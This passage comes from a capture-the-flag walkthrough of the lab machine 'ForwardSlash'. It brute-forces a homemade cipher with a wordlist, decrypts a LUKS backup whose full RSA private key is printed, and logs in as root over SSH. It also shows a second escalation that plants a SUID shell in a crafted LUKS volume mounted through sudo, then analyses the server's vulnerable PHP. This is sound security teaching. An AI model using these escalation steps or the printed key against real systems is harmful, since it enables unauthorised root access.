        for i in reversed(range(len(msg))):
            if i == 0:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
            else:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
            while tmp < 0:
                tmp += 256
            msg[i] = chr(tmp)
    return ''.join(msg)

print encrypt('REDACTED', 'REDACTED')
print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))

```

This is Python2 (see the `print` call at the end without `()`), so these strings can also be bytes.

It starts by taking the first character of the key. It then loops through the message, for each character adding the character plus the key byte plus the previous character, all mod 256. The it repeats for each character in the key.

### Recover Key

I copied the script back to my workstation and commented out the two test lines at the bottom. Then I wrote a little brute force script that would try to decrypt against passwords from `rockyou.txt`:

```

import encryptor
import sys 

with open('./ciphertext', 'rb') as f:
    ciphertext = f.read()

i = 0 
with open('/usr/share/wordlists/rockyou.txt', 'r') as f:
    for passwd in f:
        i += 1
        sys.stdout.write("\r{}".format(i) + " "*10)
        passwd = passwd.strip()
        res = encryptor.decrypt(passwd, ciphertext)
        if sum([ord(c) < 128 for c in res]) > 140:
            print("\r" + passwd + ":" + res)

```

I originally checked for `all([ord(c) < 128 for c in res])`, but it didn’t get any hits. I decided to give some flexibility in case some junk characters were in the plaintext (so now I’m only looking for more than 140 characters , and it produced a handful of results, at least two of which seem to contain at least part of the decrypted message:

```

root@kali# python brute_crypter.py
mychemicalromance:פ(aPev|'sprlk't'ul~'lujyw{pvu'{vvs3'wyl{{'zlj|yl'o|o3'hu~h'olyl'pz'{ol'rl'{v'{ol'lujyw{lk'pthnl'myvt'6}hy6ihjr|wz6yljv}lyA'jI(=,zkO?SqeG`1+J9jm
teamareporsiempre:j%    9[lOyou liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf
professionaltools:$aJ 
                      9Vه*}sy$pmoih$q}$ri{$irgv}txmsr$xssp0$tvixx}$wigyvi$lyl0$er}{e}$livi$mw$xli$oi}$xs$xli$irgv}txih$mqeki$jvsq$3zev3fegoytw3vigsziv}>$gF%:)whL<PnbD].(G6gj
manchester united:M'$Pu
                       Xrv|'sprlk't'ul~'lujyw{pvu'{vvs3'wyl{{'zlj|yl'o|o3'hu~h'olyl'pz'{ol'rl'{v'{ol'lujyw{lk'pthnl'myvt'6}hy6ihjr|wz6yljv}lyA'jI(=,zkO?SqeG`1+J9jm
the rock you team:c&Ō) you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf
onlygodcanjudgeme:jv{$/ Y~tz%qnpji%r~%sj|%jshw~uynts%yttq1%uwjyy~%xjhzwj%mzm1%fs~|f~%mjwj%nx%ymj%pj~%yt%ymj%jshw~uyji%nrflj%kwtr%4{fw4gfhpzux4wjht{jw~?%hG&;*xiM=QocE^/)H7hk
mariadelosangeles:`~!w-v|'sprlk't'ul~'lujyw{pvu'{vvs3'wyl{{'zlj|yl'o|o3'hu~h'olyl'pz'{ol'rl'{v'{ol'lujyw{lk'pthnl'myvt'6}hy6ihjr|wz6yljv}lyA'jI(=,zkO?SqeG`1+J9jm
password123456789:nUAT)!}sy$pmoih$q}$ri{$irgv}txmsr$xssp0$tvixx}$wigyvi$lyl0$er}{e}$livi$mw$xli$oi}$xs$xli$irgv}txih$mqeki$jvsq$3zev3fegoytw3vigsziv}>$gF%:)whL<PnbD].(G6gj
...[snip]...

```

Interestingly, there were multiple passwords that decrypted the message:

```

teamareporsiempre
the rock you team

```

There are definitely some issues with this crypto. It turns out that any password starting with `t` and that’s 17 characters will break it, though the first 17 characters are jumbled.

I spent a bit of time trying to understand this crypto and why it is broken, but I didn’t get too far. The lesson here is don’t roll your own crypto.

### Luks

With the key, I can now run the commands from `sudo -l`. First, I’ll run `cryptsetup luksOpen` on the image file:

```

pain@forwardslash:~/encryptorinator$ sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img
Command requires device and mapped name as arguments.

```

It looks like I need to provide a mapped name. I’ll call it `backup` since that’s what I’ll use in the next step:

```

pain@forwardslash:~/encryptorinator$ sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup
Enter passphrase for /var/backups/recovery/encrypted_backup.img:
pain@forwardslash:/$ ls /dev/mapper/
backup  control

```

After running that, there’s now a device at `/dev/mapper/backup`.

Next I’ll mount that, working out of `/dev/shm`, after creating a `mnt` folder, again to fit the `sudo` grant:

```

pain@forwardslash:/dev/shm$ mkdir mnt
pain@forwardslash:/dev/shm$ sudo /bin/mount /dev/mapper/backup ./mnt/

```

The filesystem contains a single file, an RSA key:

```

pain@forwardslash:/dev/shm/mnt$ ls
id_rsa
pain@forwardslash:/dev/shm/mnt$ cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK
RKh+WDykv/gukvUSauxWJndPq3F1Ck0xbcGQu6+1OBYb+fQ0B8raCRjwtwYF4gaf
yLFcOS111mKmUIB9qR1wDsmKRbtWPPPvgs2ruafgeiHujIEkiUUk9f3WTNqUsPQc
u2AG//ZCiqKWcWn0CcC2EhWsRQhLOvh3pGfv4gg0Gg/VNNiMPjDAYnr4iVg4XyEu
NWS2x9PtPasWsWRPLMEPtzLhJOnHE3iVJuTnFFhp2T6CtmZui4TJH3pij6wYYis9
MqzTmFwNzzx2HKS2tE2ty2c1CcW+F3GS/rn0EQIDAQABAoIBAQCPfjkg7D6xFSpa
V+rTPH6GeoB9C6mwYeDREYt+lNDsDHUFgbiCMk+KMLa6afcDkzLL/brtKsfWHwhg
G8Q+u/8XVn/jFAf0deFJ1XOmr9HGbA1LxB6oBLDDZvrzHYbhDzOvOchR5ijhIiNO
3cPx0t1QFkiiB1sarD9Wf2Xet7iMDArJI94G7yfnfUegtC5y38liJdb2TBXwvIZC
vROXZiQdmWCPEmwuE0aDj4HqmJvnIx9P4EAcTWuY0LdUU3zZcFgYlXiYT0xg2N1p
MIrAjjhgrQ3A2kXyxh9pzxsFlvIaSfxAvsL8LQy2Osl+i80WaORykmyFy5rmNLQD
Ih0cizb9AoGBAP2+PD2nV8y20kF6U0+JlwMG7WbV/rDF6+kVn0M2sfQKiAIUK3Wn
5YCeGARrMdZr4fidTN7koke02M4enSHEdZRTW2jRXlKfYHqSoVzLggnKVU/eghQs
V4gv6+cc787HojtuU7Ee66eWj0VSr0PXjFInzdSdmnd93oDZPzwF8QUnAoGBAPhg
e1VaHG89E4YWNxbfr739t5qPuizPJY7fIBOv9Z0G+P5KCtHJA5uxpELrF3hQjJU8
6Orz/0C+TxmlTGVOvkQWij4GC9rcOMaP03zXamQTSGNROM+S1I9UUoQBrwe2nQeh
i2B/AlO4PrOHJtfSXIzsedmDNLoMqO5/n/xAqLAHAoGATnv8CBntt11JFYWvpSdq
tT38SlWgjK77dEIC2/hb/J8RSItSkfbXrvu3dA5wAOGnqI2HDF5tr35JnR+s/JfW
woUx/e7cnPO9FMyr6pbr5vlVf/nUBEde37nq3rZ9mlj3XiiW7G8i9thEAm471eEi
/vpe2QfSkmk1XGdV/svbq/sCgYAZ6FZ1DLUylThYIDEW3bZDJxfjs2JEEkdko7mA
1DXWb0fBno+KWmFZ+CmeIU+NaTmAx520BEd3xWIS1r8lQhVunLtGxPKvnZD+hToW
J5IdZjWCxpIadMJfQPhqdJKBR3cRuLQFGLpxaSKBL3PJx1OID5KWMa1qSq/EUOOr
OENgOQKBgD/mYgPSmbqpNZI0/B+6ua9kQJAH6JS44v+yFkHfNTW0M7UIjU7wkGQw
ddMNjhpwVZ3//G6UhWSojUScQTERANt8R+J6dR0YfPzHnsDIoRc7IABQmxxygXDo
ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o
-----END RSA PRIVATE KEY-----

```

### SSH

With this key, I can SSH as root into ForwardSlash:

```

root@kali# ssh -i ~/keys/id_rsa_forwardslash_root root@10.10.10.183
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Apr  6 14:56:56 UTC 2020

  System load:  0.01               Processes:            182
  Usage of /:   30.9% of 19.56GB   Users logged in:      1
  Memory usage: 21%                IP address for ens33: 10.10.10.183
  Swap usage:   0%
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

16 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Apr  5 20:49:44 2020 from 10.10.14.24
root@forwardslash:~#

```

And grab `root.txt`:

```

root@forwardslash:~# cat root.txt
cc37ab30************************

```

### Alternative Exploit sudo Luks

Because pain is able to run `cryptsetup` and `mount` as root, I can ignore trying to open the encrypted volume on the box, and just create my own instead. I’ll add a setuid shell to the volume, and then on mounting it, I can get a root shell.

On my Kali box, I’ll create a luks container using [this walkthrough](https://blog.canadianwebhosting.com/how-to-create-an-encrypted-container/). First, create the file with `dd` that’s 20M in size:

```

root@kali# dd if=/dev/zero of=mal.luks bs=1024 count=20480
20480+0 records in
20480+0 records out
20971520 bytes (21 MB, 20 MiB) copied, 3.05364 s, 6.9 MB/s

root@kali# ls -lh mal.luks 
-rwxrwx--- 1 root vboxsf 20M Jul  3 21:51 mal.luks

```

This creates a file of all 0s, 20M in size.

Rather than create a key file, I’ll just use a password. I’ll run `cryptsetup` to initialize the Luks partition:

```

root@kali# cryptsetup luksFormat mal.luks 

WARNING!
========
This will overwrite data on mal.luks irrevocably.

Are you sure? (Type 'yes' in capital letters): YES
Enter passphrase for mal.luks: 
Verify passphrase: 

```

Now I’ll map the volume to a `/dev` with `cryptsetup luksOpen`:

```

root@kali# cryptsetup luksOpen mal.luks fsmal
Enter passphrase for mal.luks: 

```

Now the device exists:

```

root@kali# ls /dev/mapper/
fsmal

```

I’ll create a file system in the volume:

```

root@kali# mkfs.ext4 /dev/mapper/fsmal 
mke2fs 1.45.6 (20-Mar-2020)
Creating filesystem with 4096 1k blocks and 1024 inodes

Allocating group tables: done                            
Writing inode tables: done                            
Creating journal (1024 blocks): done
Writing superblocks and filesystem accounting information: done

```

Now I’ll mount the volume:

```

root@kali# mount /dev/mapper/fsmal /mnt/

```

For a payload, I’ll add a copy of `dash` and make it SUID:

```

root@kali# cp /bin/dash /mnt/
root@kali# chmod 4777 /mnt/dash 
root@kali# ls -l /mnt/dash
-rwsrwxrwx 1 root root 121464 Jul  3 21:57 /mnt/dash

```

Now I’ll unmount and close it:

```

root@kali# umount /mnt 
root@kali# cryptsetup luksClose fsmal 

```

I’ll move this to ForwardSlash using `scp` into `/dev/shm`. Now I’ll use the commands pain can run with `sudo` to mount the volume:

```

pain@forwardslash:/dev/shm$ sudo /sbin/cryptsetup luksOpen mal.luks backup
Enter passphrase for mal.luks: 
pain@forwardslash:/dev/shm$ sudo /bin/mount /dev/mapper/backup ./mnt/

```

Now I’ll just run the SUID binary:

```

pain@forwardslash:/dev/shm$ mnt/dash -p
# id
uid=1000(pain) gid=1000(pain) euid=0(root) groups=1000(pain),1002(backupoperator)

```

## Beyond Root

All of Beyond Root here is focused on digging into different aspects of the web server.

### IP / Username Blocking

I was surprised when I could create the admin account and then access `/dev` so I wanted to check out the source. The page starts with:

```

<?php
//include_once ../session.php;
// Initialize the session
session_start();

if((!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true || $_SESSION['username'] !== "admin") && $_SERVER['REMOTE_ADDR'] !== "127.0.0.1"){
    header('HTTP/1.0 403 Forbidden');
    echo "<h1>403 Access Denied</h1>";
    echo "<h3>Access Denied From ", $_SERVER['REMOTE_ADDR'], "</h3>";
    //echo "<h2>Redirecting to login in 3 seconds</h2>"
    //echo '<meta http-equiv="refresh" content="3;url=../login.php" />';
    //header("location: ../login.php");
    exit;
}
?>
<html>
        <h1>XML Api Test</h1>
        <h3>This is our api test for when our new website gets refurbished</h3>
        <form action="/dev/index.php" method="get" id="xmltest">
                <textarea name="xml" form="xmltest" rows="20" cols="50"><api>
    <request>test</request>
</api>
...[snip]...

```

Getting access to the page relies on this being false:

```

!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true || $_SESSION['username'] !== "admin") && $_SERVER['REMOTE_ADDR'] !== "127.0.0.1"

```

This statement is confusing, so I’ll break out the PHP command line. As I am logged in, the first two are `FALSE`.

When I hit `/dev` logged in as 0xdf from my host, the last two are true, and I don’t get in:

```

php > if(FALSE || FALSE || TRUE  && TRUE){echo "403";} else {echo "200";}+
403

```

When I was admin instead, I get in:

```

php > if(FALSE || FALSE || FALSE  && TRUE){echo "403";} else {echo "200";}
200

```

When I hit it with the RFI (so the `$_SERVER['REMOTE_ADDR']` is 127.0.0.1), it also let’s me in, regardless of username:

```

php > if(FALSE || FALSE || TRUE  && FALSE){echo "403";} else {echo "200";}
200
php > if(FALSE || FALSE || FALSE  && FALSE){echo "403";} else {echo "200";}
200

```

### api.php

#### Analysis

I was also surprised when I used the LFI to fetch the page source, and it replied “Permission Denied; not that way ;)”. The clear implication from the box author is that I should be using the XXE, though I quickly found a way around that. But I wanted to see how that filter was implemented.

The key part of `profilepicture.php` is right at the end, when a POST is submitted:

```

<?php
if (isset($_POST['url'])) {
        $url = 'http://backup.forwardslash.htb/api.php';
        $data = array('url' => $_POST['url']);

        $options = array(
                'http' => array(
                        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                        'method'  => 'POST',
                        'content' => http_build_query($data)
                )
        );
        $context = stream_context_create($options);
        $result = file_get_contents($url, false, $context);
        echo $result;
        exit;
}
?>

```

It sends a POST request to `backup.forwardslash.htb/api.php` with the data `url=[provided url]`, reads the results and then `echo` them onto the page.

`api.php` makes the request:

```

<?php

session_start();

if (isset($_POST['url'])) {

        if((!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true) && $_SERVER['REMOTE_ADDR'] !== "127.0.0.1"){
                echo "User must be logged in to use API";
                exit;
        }

        $picture = explode("-----output-----<br>", file_get_contents($_POST['url']));
        if (strpos($picture[0], "session_start();") !== false) {
                echo "Permission Denied; not that way ;)";
                exit;
        }
        echo $picture[0];
        exit;
}
?>
<!-- TODO: removed all the code to actually change the picture after backslash gang attacked us, simply echos as debug now -->

```

First, there’s a check. If there’s no logged in user (which is true in this case) and the remote address isn’t localhost (false here), there’s an error message.

Now, the code will run `file_get_contents()` on the passed url. Interestingly, [this function](https://www.php.net/manual/en/function.file-get-contents.php) can be used to open a local file or a file referenced by url:

> **Tip** A URL can be used as a filename with this function if the [fopen wrappers](https://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-fopen) have been enabled. See [fopen()](https://www.php.net/manual/en/function.fopen.php) for more details on how to specify the filename. See the [Supported Protocols and Wrappers](https://www.php.net/manual/en/wrappers.php) for links to information about what abilities the various wrappers have, notes on their usage, and information on any predefined variables they may provide.

`explode()` just breaks the resulting string into an array of strings on the delimiter `-----output-----<br>`. I wouldn’t expect that to show up in the PHP source, so `$picture` file an array with a single string.

The next check is what prevents the leaking of PHP source directory. `$picture[0]` is the PHP source I just requested. If the string “session\_start();” is in that source at any position, the “Permission Denied; not that way” message is returned. Otherwise, the string is returned.

#### Methods

This PHP code was not easy for me to read. It used a lot of double-negatives and complex non-obvious boolean checks. Rather than site down and try to re-write it or make boolean tables, I decided to play with the code itself. I SSHed into ForwardSlash twice in two tmux panes. I touched a file in `/dev/shm` that I would use to get message, and made sure that it was world-writable. Then I ran `tail -f` on it, which will hold open that process and continue to print new lines as they are written to the file. In the other pane, I opened `api.php` in `vim`, and added a `file_put_contents` line to write to `/dev/shm/.0xdf` things I wanted to see.

Now I sent the POST request to `profilepicture.php` with data `url=/var/www/backup.forwardslash.htb/index.php` using Burp Repeater, resulting in the output in the bottom pane:

[![terminal](https://0xdfimages.gitlab.io/img/image-20200630213026959.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200630213026959.png)

In this case it’s 33, the position where “session\_start();” occurs in the file I’m trying to leak (and therefore the reason it returns an error).

Now I can easily change what is logged, and send via Repeater again, and see more output.